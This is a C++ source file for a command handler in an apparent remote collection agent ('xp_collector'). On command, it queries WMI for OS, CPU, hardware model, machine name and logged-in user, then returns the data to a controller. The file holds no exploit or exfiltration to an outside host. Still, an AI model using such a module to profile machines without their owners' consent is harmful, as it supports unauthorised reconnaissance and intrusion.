#include "GetSystemInfoHandler.h"

#include "Products/SystemInfoProduct.h"
#include "Protocol/ReturnProductRequest.h"
#include "Windows/WinUtils.h"

xp_collector::GetSystemInfoHandler::GetSystemInfoHandler(std::string command_id)
	: ICommandHandler(std::move(command_id))
{
}

std::unique_ptr<xp_collector::IRequest> xp_collector::GetSystemInfoHandler::handle(
	std::shared_ptr<BasicCommand>& command)
{
	nlohmann::json system_info;

	system_info["OperatingSystem"] = windows::query_wmi(L"Win32_OperatingSystem", {
		                                                    L"Caption", L"Version", L"BuildNumber", L"OSArchitecture"
	                                                    });

	system_info["Processor"] = windows::query_wmi(L"Win32_Processor", {
		                                              L"Name", L"NumberOfCores", L"NumberOfLogicalProcessors",
		                                              L"MaxClockSpeed"
	                                              });

	system_info["ComputerSystem"] = windows::query_wmi(L"Win32_ComputerSystem", {
		                                                   L"Manufacturer", L"Model", L"TotalPhysicalMemory",
		                                                   L"UserName", L"Name"
	                                                   });
	return std::make_unique<ReturnProductRequest>(
		RequestHeader{RequestType::ReturnProduct, m_client_id},
		std::make_unique<SystemInfoProduct>(command->get_command_id(), CommandType::GetSystemInfo, system_info)
	);
}
